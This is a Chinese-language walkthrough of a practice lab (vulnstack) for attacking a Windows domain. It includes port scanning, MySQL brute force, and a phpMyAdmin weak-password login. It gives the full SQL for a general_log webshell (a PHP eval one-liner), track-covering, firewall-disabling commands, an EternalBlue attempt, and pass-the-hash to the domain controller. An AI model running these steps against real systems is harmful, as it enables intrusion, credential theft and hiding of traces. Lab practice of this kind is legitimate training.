0x00 靶场环境搭建

1、从网上下载http://vulnstack.qiyuanxuetang.net/vuln/detail/2/三台虚拟机，解压缩后用vmware打开。不要开机，先配置网络。配置网络的时候注意，不要用NAT或者桥接来模拟外网段，因为外网段是存在god.org这个域环境的，容易在靶场中出现各种问题。

2、新建两个仅主机网段vmnet1、vmnet2，给三台虚拟机按照下图配置。因为域控机器的存在，肯定是固定的ip，所以我们这里将vmnet2改为192.168.52.0/24的网段。

3、随后注意配置网络时，一定要先开域控机器，不然很容易报错。所以我这里启动虚拟机的顺序为win08——win03——win7，默认登录的密码为hongrisec@2019，不过有些机器打开后提示密码过期，我们改一下密码就好。

搭建的坑点

1、看到上面的表估计很多同学会一脸懵，为什么域成员机器也登录的域管理用户？？我其实也很懵，估计就是想要模仿一个域管理员没有退出登录的情况吧。

2、边界机windows2007的域环境网卡与外网网卡需要仔细斟酌，对应起来。

3、将windows2007的phpstudy打开，才能渗透。桌面上放了个Everything，可能是在暗示你安装吧。记得把它改成系统服务。如果phpstudy启动报错，重启一下机器就行了。

0x01 外网信息收集

信息收集的重要性不多说，渗透测试的本质就是信息收集。信息收集的方法与工具琳琅满目，建议大家在实战中多多练习，形成一套属于自己的流程即可。

但是注意要围绕着一个原则：信息收集是一个不断验证你的判断的过程，需要多方面去收集、验证。这里放上我的大致信息收集流程

我们这里直接进行端口信息收集以及目录爆破

nmap -Pn -sT -p 1-1000,1080,3306,3389,6379,27017,8080,8888 192.168.72.178python3 dirsearch.py -u http://192.168.72.178 -e* -x 301

0x02 获取webshell

根据信息收集来的信息，可以建立渗透思路

1、3306端口暴力破解

对于3306端口暴力破解，可以利用hydra工具来破解。不过需要一个前提，就是这个服务器开启了3306外连。可以看到这里并没有开启外连。

hydra -L xx.txt -P xx.txt mysql://192.168.72.178 -t 16 -e ns -f -vV -I

2、phpmyadmin

对于phpmyadmin渗透，使用Burpsuite暴力破解后台，需要注意的是，对于登录框的BP暴力破解，不要点击这个跳转，不然所有的结果都是200

看来想多了，应该先用弱口令尝试的root:root


3、后台登陆phpmyadmin信息收集

3-1、登陆phpmyadmin后，看看能不能直接写入webshell，毕竟有root权限。

 select user(); select @@version; select @@version_compile_os; select database(); show variables like '%secure%'; show variables like '%general_log%'

这里可以看到并没有可读写权限，根本打不开。

3-2、尝试通过general_log日志getshell

1、查看并没有开启日志文件，尝试打开，打开成功

2、将日志路径更改为之前信息收集到的网站根目录，并且日志文件变为php文件

3、输入sql语句，这时候，general_log即1.php 文件里面就会有下方这句话。

select "<?php @eval($_REQUEST['7jdeE$@comT'])?>";

4、打开蚁剑访问，成功getshell

5、最后一步，将刚才日志文件的路径还原，算是清除痕迹

6、上述的方法，其实可以完全使用命令行来getshell

show variables like '%general%';set global general_log ="ON";set global general_log_file='C:/phpStudy/WWW/1.php'; #这里写成\会出错哦select "<?php @eval($_REQUEST['7jdeE$@comT'])?>";set global general_log_file='C:/phpStudy/MySQL/data/stu1.log';

0x04 内网信息收集

内网信息收集极其复杂，没办法，渗透的本质就是信息收集，取决于你对信息的理解能力以及能否将收集到的信息处理成对应的逻辑。我这里就介绍一下关键的几个点，大家可以跟着敲一敲，还是能学到不少。

1、环境信息

  • 系统与补丁信息

下面这条命令有个小bug，不知道为什么在蚁剑这里显示的是x86。

  • 当前运行进程与杀软信息

 tasklist 或者 tasklist /svc
 wmic process list brief

那么既然这里没有杀软，我们就可以直接使用msf或者CS进行上线了。这样就舒服多了。

  • 虚拟环境判断：是否为docker环境、vm环境

Windows只要查看是否为vm环境即可，没有docker来创建windows系统的，这违背了docker的便捷性。

 ls / -alh .dockerenv
 cat /proc/1/cgroup
 #也可以用msf的后渗透模块
 meterpreter>run post/linux/gather/checkvm           #判断当前linux是否为vm环境
 meterpreter>run post/linux/gather/checkcontainer    #判断当前linux是否为docker环境
 meterpreter>run post/windows/gather/checkvm         #判断当前windows是否为vm环境

  • 语言命令环境：判断机器安装了哪些编程语言

 where php python java go perl ruby curl certutil #Linux就是whereis
 wmic product get name,version   #推荐
 meterpreter>run post/windows/gather/enum_applications   #强烈推荐，速度很快

  • 本地网络：网卡信息、判断域环境、防火墙等

 ipconfig /all
 route print -4  
 net time /domain
 
 netsh firewall show state                   #查看防火墙状态
 netsh firewall set opmode mode=enable       #开启防火墙
 netsh firewall set opmode mode=disable      #关闭防火墙
 #上面三个防火墙命令已经不推荐，使用下面这三个即可。
 netsh advfirewall show state all state      #查看防火墙状态
 netsh advfirewall set allprofiles state on  #开启防火墙
 netsh advfirewall set allprofiles state off #关闭防火墙

2、用户信息

  • 本地用户与SID

 whoami /user
 hostname
 net user

  • 历史登录与在线用户信息

 query user      #windows
 last/lastb/who  #linux

3、域环境信息收集

  • 判断是否存在多域

 net view /domain

  • 单域信息收集

net view                 #查看局域网内其他主机名
net config Workstation#查看机器名、全名、用户名、系统版本、工作站、域、登录域
net user /domain         #查看域用户
wmic useraccount get /all #查看
net localgroup administrators #查看本地管理员组（通常会有域用户）
net view /domain         #查看有几个域
net user 用户名 /domain   #获取指定域用户的信息
net group /domain#查看域里面的工作组，查看把用户分了多少组（域控上操作）
net group 组名 /domain    #查看域中某工作组
net group "domain admins" /domain  #查看域管理员的名字
net group "domain computers" /domain  #查看域中的其他主机名
net group "doamin controllers" /domain  #查看域控制器主机名
ping 域控.域名

  • 多网段域环境

这里说的不是多域环境，而是多个网段的域环境。例如我域控是10网段，可能域成员机器在192网段。只要两个网段做一个路由就行了。

主机发现

1、使用arp扫描进行主机发现，是因为arp协议为IP与MAC地址对照表，同时内网利用arp可以很迅速精准的探测出存活机器。

run arp_scanner -r 192.168.52.0/24


域控端口扫描

1、这里我们先对域控机器进行端口扫描，假设域控机器存在一些漏洞，可以直接拿下，从而控制整个网络。

最准确的还是tcp三次握手四次挥手。这里需要对内网的两台机器都进行扫描。使用tcp扫描的时间过于长，实在是等不下去了，受不了了，这里可以转到CS上进行信息收集，也可以使用fscan去信息收集。可以看出域控机器为windows2008。

use auxiliary/scanner/portscan/tcp#tcp扫描，不太推荐，速度很慢fscan64.exe -h 192.168.52.0/24 #go语言编写的，一键起飞，推荐

2、尝试使用永恒之蓝攻打。一定要选择正向的payload，因为MSF建立的路由流量是正向的。遇到这种情况，可能是windows7的防火墙没关，target没有设置问题。

3、切回到win7，关闭防火墙，设置target，依然打不通。

4、结果依然是失败的，一般来讲不要轻易去尝试永恒之蓝，容易把对方机器打崩溃。所以谨慎为妙，换个攻击方式。回到win7的session中，我们尝试探测一下域控的SMB协议对应的admin$有无打开。注意，dir \\DC\C$此命令只有域管理员权限才可看到域控的C$。这里能够看到是因为我们获得的就是域管理员的权限。

5、所以我们可以直接使用hash传递，批量上线就可以了。对于hash传递的手法，也很多：MSF的psexec模块，CS的jump，还有mimikatz、impacket脚本等，这里就演示一个CS的jump，我们看到这个是administrator权限，就可以尝试使用令牌窃取生成个system权限。这个功能类似于MSF的getsystem。

如果我们获取到的不是一个域管理员权限，那么就无法hashdump，同时也无法关闭防火墙。如果内网需要各种文件流量进行传输的话，提权还是很有必要的，

CS Pass the Hash

1、我们有win7机器的administrator权限，所以可以获取明文密码。

2、使用CS的net view功能扫描一下网段，发现了这个域控机器

3、随后在这里点击hash传递

4、进行下图这样的配置

能看到其实就是帮我们使用了mimikatz这个软件的命令，同时是基于的SMB协议，上传文件，注册服务，返回链接。成功上线域控机器


5、同理，将目标192.168.52.141上线。到此，实验结束。
